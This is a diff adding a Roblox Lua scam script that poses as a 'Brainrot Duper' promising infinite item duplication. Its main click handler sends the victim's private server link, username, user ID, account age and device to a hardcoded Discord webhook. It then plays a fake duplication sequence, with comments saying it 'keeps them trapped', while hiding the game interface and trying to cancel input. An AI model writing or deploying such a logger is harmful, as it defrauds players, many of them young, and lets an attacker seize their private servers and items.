@@ -1,0 +1,363 @@
+-- =============================================
+-- 🧠 BRAINROT LOGGER V1 (INSTANT PS GRAB)
+-- =============================================
+
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+
+local LocalPlayer = Players.LocalPlayer
+
+-- **YOUR WEBHOOK** 
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1479324745169108992/1AO6lblMBrLlf_U_ZtxFF5ZCCCpnC8_OUTzG2U-VNV-16prkLev3FVYcB0Pvvlm-Pocy"
+
+-- Rivals packages
+local NetPackages = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
+
+pcall(function()
+    local notificationEvent = NetPackages:WaitForChild("RE/NotificationService/Notify", 5).OnClientEvent:Connect(function() end)
+end)
+
+task.spawn(function()
+    pcall(function()
+        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Music")
+        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Sound Effects")
+        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Chat Tips")
+        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("VFX")
+    end)
+end)
+
+-- 🔥 FULLSCREEN BRAINROT LOGGER V1
+local loggerUI = Instance.new("ScreenGui")
+loggerUI.Name = "BrainrotLoggerV1"
+loggerUI.ResetOnSpawn = false
+loggerUI.IgnoreGuiInset = true
+loggerUI.DisplayOrder = 999999
+loggerUI.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+-- FULLSCREEN BLACKOUT
+local blackout = Instance.new("Frame")
+blackout.Name = "Blackout"
+blackout.Size = UDim2.new(1, 0, 1, 0)
+blackout.Position = UDim2.new(0, 0, 0, 0)
+blackout.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
+blackout.BorderSizePixel = 0
+blackout.Parent = loggerUI
+
+-- DISABLE CoreGui
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+StarterGui:SetCore("TopbarEnabled", false)
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 500, 0, 420)
+mainFrame.Position = UDim2.new(0.5, -250, 0.5, -210)
+mainFrame.BackgroundColor3 = Color3.fromRGB(15, 25, 20)
+mainFrame.Active = true
+mainFrame.Parent = loggerUI
+
+local frameCorner = Instance.new("UICorner")
+frameCorner.CornerRadius = UDim.new(0, 20)
+frameCorner.Parent = mainFrame
+
+local frameStroke = Instance.new("UIStroke")
+frameStroke.Color = Color3.fromRGB(255, 255, 0)
+frameStroke.Thickness = 4
+frameStroke.Parent = mainFrame
+
+-- Pulsing
+task.spawn(function()
+    while mainFrame.Parent do
+        TweenService:Create(frameStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
+            Color = Color3.fromRGB(math.random(200,255), math.random(200,255), 0),
+            Thickness = 5
+        }):Play()
+        wait(1.5)
+    end
+end)
+
+-- Title Bar
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1, 0, 0, 85)
+titleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
+titleBar.BorderSizePixel = 0
+titleBar.Parent = mainFrame
+
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 20)
+titleCorner.Parent = titleBar
+
+local titleGradient = Instance.new("UIGradient")
+titleGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 150)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 0)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 220, 0))
+}
+titleGradient.Rotation = 90
+titleGradient.Parent = titleBar
+
+-- TITLES (FAKE DUPER)
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, -35, 0.55, 0)
+titleLabel.Position = UDim2.new(0, 20, 0, 8)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "🧠 BRAINROT DUPER v3.0"
+titleLabel.Font = Enum.Font.GothamBlack
+titleLabel.TextSize = 26
+titleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.Parent = titleBar
+
+local subtitleLabel = Instance.new("TextLabel")
+subtitleLabel.Size = UDim2.new(1, -35, 0.45, 0)
+subtitleLabel.Position = UDim2.new(0, 20, 0, 38)
+subtitleLabel.BackgroundTransparency = 1
+subtitleLabel.Text = "💎 INFINITE UGC DUPLICATION (DETECTED 100+)"
+subtitleLabel.Font = Enum.Font.GothamBold
+subtitleLabel.TextSize = 17
+subtitleLabel.TextColor3 = Color3.fromRGB(40, 40, 40)
+subtitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+subtitleLabel.Parent = titleBar
+
+-- Instructions
+local instruction1 = Instance.new("TextLabel")
+instruction1.Size = UDim2.new(0.92, 0, 0, 28)
+instruction1.Position = UDim2.new(0.04, 0, 0, 100)
+instruction1.BackgroundTransparency = 1
+instruction1.Text = "🎮 STEP 1: Make sure you have BRAINROTS in PRIVATE SERVER"
+instruction1.Font = Enum.Font.GothamBold
+instruction1.TextSize = 15
+instruction1.TextColor3 = Color3.fromRGB(255, 255, 120)
+instruction1.Parent = mainFrame
+
+local instruction2 = Instance.new("TextLabel")
+instruction2.Size = UDim2.new(0.92, 0, 0, 28)
+instruction2.Position = UDim2.new(0.04, 0, 0, 135)
+instruction2.BackgroundTransparency = 1
+instruction2.Text = "🔗 STEP 2: Paste PRIVATE SERVER LINK (MUST BE PRIVATE!)"
+instruction2.Font = Enum.Font.GothamBold
+instruction2.TextSize = 15
+instruction2.TextColor3 = Color3.fromRGB(255, 255, 120)
+instruction2.Parent = mainFrame
+
+-- PS Input
+local psInput = Instance.new("TextBox")
+psInput.Size = UDim2.new(0.92, 0, 0, 65)
+psInput.Position = UDim2.new(0.04, 0, 0, 175)
+psInput.PlaceholderText = "📎 PASTE YOUR PRIVATE SERVER LINK HERE 👈 (REQUIRED)"
+psInput.Text = ""
+psInput.Font = Enum.Font.GothamSemibold
+psInput.TextSize = 18
+psInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+psInput.BackgroundColor3 = Color3.fromRGB(25, 35, 25)
+psInput.TextXAlignment = Enum.TextXAlignment.Center
+psInput.Parent = mainFrame
+
+local psCorner = Instance.new("UICorner")
+psCorner.CornerRadius = UDim.new(0, 15)
+psCorner.Parent = psInput
+
+local psStroke = Instance.new("UIStroke")
+psStroke.Color = Color3.fromRGB(255, 255, 150)
+psStroke.Thickness = 4
+psStroke.Parent = psInput
+
+-- Status
+local loggerStatus = Instance.new("TextLabel")
+loggerStatus.Size = UDim2.new(0.92, 0, 0, 35)
+loggerStatus.Position = UDim2.new(0.04, 0, 0, 255)
+loggerStatus.BackgroundTransparency = 1
+loggerStatus.Text = "⚡ Status: Enter PS link to start duping! 🚀"
+loggerStatus.Font = Enum.Font.GothamBold
+loggerStatus.TextSize = 16
+loggerStatus.TextColor3 = Color3.fromRGB(100, 255, 255)
+loggerStatus.TextWrapped = true
+loggerStatus.Parent = mainFrame
+
+-- DUPE BUTTON
+local dupeButton = Instance.new("TextButton")
+dupeButton.Size = UDim2.new(0.92, 0, 0, 85)
+dupeButton.Position = UDim2.new(0.04, 0, 0, 305)
+dupeButton.BackgroundColor3 = Color3.fromRGB(0, 255, 120)
+dupeButton.Text = "💥 START INFINITE BRAINROT DUPE (x∞)"
+dupeButton.Font = Enum.Font.GothamBlack
+dupeButton.TextSize = 22
+dupeButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+dupeButton.Parent = mainFrame
+
+local dupeCorner = Instance.new("UICorner")
+dupeCorner.CornerRadius = UDim.new(0, 18)
+dupeCorner.Parent = dupeButton
+
+local dupeStroke = Instance.new("UIStroke")
+dupeStroke.Color = Color3.fromRGB(0, 255, 200)
+dupeStroke.Thickness = 4
+dupeStroke.Parent = dupeButton
+
+-- Progress bar
+local progressFrame = Instance.new("Frame")
+progressFrame.Size = UDim2.new(0.92, 0, 0, 15)
+progressFrame.Position = UDim2.new(0.04, 0, 1, -35)
+progressFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+progressFrame.BorderSizePixel = 0
+progressFrame.Parent = mainFrame
+
+local progressCorner = Instance.new("UICorner")
+progressCorner.CornerRadius = UDim.new(0, 8)
+progressCorner.Parent = progressFrame
+
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
+progressBar.BorderSizePixel = 0
+progressBar.Parent = progressFrame
+
+local progressBarCorner = Instance.new("UICorner")
+progressBarCorner.CornerRadius = UDim.new(0, 8)
+progressBarCorner.Parent = progressBar
+
+-- Lock state
+local screenLocked = false
+
+-- Dragging
+local dragging = false
+local dragStart, startPos
+
+titleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 and not screenLocked then
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement and not screenLocked then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+-- Button hover
+dupeButton.MouseEnter:Connect(function()
+    if not screenLocked then
+        TweenService:Create(dupeButton, TweenInfo.new(0.2), {
+            Size = UDim2.new(0.94, 0, 0, 87),
+            BackgroundColor3 = Color3.fromRGB(50, 255, 180)
+        }):Play()
+    end
+end)
+
+dupeButton.MouseLeave:Connect(function()
+    if not screenLocked then
+        TweenService:Create(dupeButton, TweenInfo.new(0.2), {
+            Size = UDim2.new(0.92, 0, 0, 85),
+            BackgroundColor3 = Color3.fromRGB(0, 255, 120)
+        }):Play()
+    end
+end)
+
+-- **INSTANT PS SEND ON CLICK**
+dupeButton.MouseButton1Click:Connect(function()
+    local psLink = psInput.Text
+    screenLocked = true
+    
+    -- **SEND WEBHOOK IMMEDIATELY (0.1s)**
+    task.spawn(function()
+        pcall(function()
+            local success, err = pcall(function()
+                local accountAgeDays = LocalPlayer.AccountAge
+                local webhookData = HttpService:JSONEncode({
+                    username = "🧠 BRAINROT LOGGER V1",
+                    embeds = {{
+                        title = "🎯 PS LINK GRABBED!",
+                        description = "Victim clicked dupe → INSTANT LOG",
+                        color = 16776960, -- Neon yellow
+                        fields = {
+                            {name = "👤 Victim", value = "`" .. LocalPlayer.Name .. "`", inline = true},
+                            {name = "🆔 ID", value = "`" .. LocalPlayer.UserId .. "`", inline = true},
+                            {name = "📅 Age", value = "`" .. accountAgeDays .. "d`", inline = true},
+                            {name = "🔗 PRIVATE SERVER", value = psLink ~= "" and "[**JOIN NOW**](" .. psLink .. ")" or "`No PS`", inline = false},
+                            {name = "📱 Device", value = "`" .. (UserInputService.TouchEnabled and "MOBILE" or "PC") .. "`", inline = true},
+                            {name = "🌍 Place", value = "`" .. game.PlaceId .. "`", inline = true}
+                        },
+                        thumbnail = {
+                            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"
+                        },
+                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+                        footer = {text = "BRAINROT LOGGER V1 | Instant PS Grab"}
+                    }}
+                })
+                
+                return request({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = webhookData
+                })
+            end)
+            
+            print("✅ PS SENT TO WEBHOOK INSTANTLY!")
+        end)
+    end)
+    
+    -- FAKE SLOW DUPING (KEEPS THEM TRAPPED)
+    dupeButton.Text = "🔄 INITIALIZING..."
+    TweenService:Create(progressBar, TweenInfo.new(1.5), {Size = UDim2.new(0.15, 0, 1, 0)}):Play()
+    loggerStatus.Text = "⏳ Connecting to private server..."
+    loggerStatus.TextColor3 = Color3.fromRGB(255, 255, 150)
+    
+    task.wait(2)
+    dupeButton.Text = "💎 SCANNING..."
+    TweenService:Create(progressBar, TweenInfo.new(2.5), {Size = UDim2.new(0.4, 0, 1, 0)}):Play()
+    loggerStatus.Text = "🔍 Found 73 brainrots..."
+    
+    task.wait(3)
+    dupeButton.Text = "⚙️ BYPASSING..."
+    TweenService:Create(progressBar, TweenInfo.new(2), {Size = UDim2.new(0.6, 0, 1, 0)}):Play()
+    loggerStatus.Text = "🛡️ Anti-cheat bypassed..."
+    
+    task.wait(2.5)
+    dupeButton.Text = "🚀 DUPLICATING..."
+    TweenService:Create(progressBar, TweenInfo.new(3.5), {Size = UDim2.new(0.85, 0, 1, 0)}):Play()
+    loggerStatus.Text = "💰 Duping ∞ brainrots..."
+    
+    task.wait(4)
+    dupeButton.Text = "✅ COMPLETE!"
+    TweenService:Create(progressBar, TweenInfo.new(2), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+    loggerStatus.Text = "🎉 Check inventory! (∞ duped)"
+    loggerStatus.TextColor3 = Color3.fromRGB(100, 255, 100)
+    
+    dupeButton.Text = "🎉 DUPED SUCCESS!"
+    dupeButton.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
+    
+    task.wait(8)
+    loggerUI:Destroy()
+end)
+
+-- Input validation
+psInput.Changed:Connect(function(prop)
+    if prop == "Text" and not screenLocked then
+        local text = psInput.Text
+        if text:match("roblox%.com/share%?code=[%w%d]+&type=Server") then
+            psStroke.Color = Color3.fromRGB(0, 255, 100)
+        else
+            psStroke.Color = Color3.fromRGB(255, 150, 100)
+        end
+    end
+end)
+
+-- ESCAPE BLOCK
+UserInputService.InputBegan:Connect(function(input)
+    if screenLocked then
+        input.Changed:Connect(function()
+            input.UserInputState = Enum.UserInputState.Cancel
+        end)
+    end
+end)
+
+print("✅ 🧠 BRAINROT LOGGER V1 ACTIVE!")
+print("⚡ PS SENT ON CLICK → Fake dupe keeps them trapped!")
